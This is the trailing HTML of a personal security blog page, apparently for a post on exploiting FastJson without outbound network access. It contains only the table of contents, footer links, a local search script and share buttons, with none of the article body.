+              <a href="/2022/11/23/Commons%20Beanutils1/" target="_self">
+                <span>Next</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AC%E6%96%87%E9%A6%96%E5%8F%91%E4%BA%8E%E5%A5%87%E5%AE%89%E4%BF%A1%E6%94%BB%E9%98%B2%E7%A4%BE%E5%8C%BA%E5%A5%87%E5%AE%89%E4%BF%A1%E6%94%BB%E9%98%B2%E7%A4%BE%E5%8C%BA-%E6%B5%85%E6%9E%90fastjson%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F-butiannet"><span class="toc-text"> 本文首发于 [奇安信攻防社区](奇安信攻防社区 - 浅析 FastJson 不出网利用方式 (butian.net))</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-jndi%E5%88%A9%E7%94%A8"><span class="toc-text"> 0x01 JNDI 利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8"><span class="toc-text"> 0x02 不出网利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-text"> 0x03 利用链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-ref"><span class="toc-text"> 0x04 $ref</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E5%8F%82%E8%80%83"><span class="toc-text"> 0x05 参考</span></a>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/ki10Moc/">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="email" href="ki10Moc1949@gmail.com">
+            <i class="iconfont icon-envelope"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="facebook" target="_blank" rel="noopener" href="https://www.facebook.com/profile.php?id=100083345720708">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="twitter" target="_blank" rel="noopener" href="https://twitter.com/ki10moc1/status/1494844731544662019?s=21&t=l-0lygAzRMHeJeBklnPt-A">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/ki10Moc/">Copyright © 2025 ki10Moc</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/ki10Moc/">霍布斯鲍姆学徒 | CTFer</a>
+        
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + FastJson%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8 + '&url=' + https%3A%2F%2Fki10moc.github.io%2F2022%2F11%2F14%2FFastJson%25E4%25B8%258D%25E5%2587%25BA%25E7%25BD%2591%25E5%2588%25A9%25E7%2594%25A8%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://ki10moc.github.io/2022/11/14/FastJson%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
